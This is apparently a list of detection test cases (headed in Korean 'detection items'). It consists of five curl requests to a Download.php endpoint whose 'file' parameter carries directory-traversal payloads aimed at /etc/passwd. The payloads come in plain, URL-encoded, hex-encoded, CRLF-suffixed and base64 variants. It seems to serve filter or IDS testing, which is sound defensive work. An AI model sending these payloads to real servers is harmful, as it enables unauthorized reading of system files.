## 탐지 항목 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/Download.php?file=../../../../etc/passwd"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/Download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd%0D%0A"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/Download.php?file=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA0K"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/Download.php?file=../../../../etc/passwd"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/Download.php?file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64"
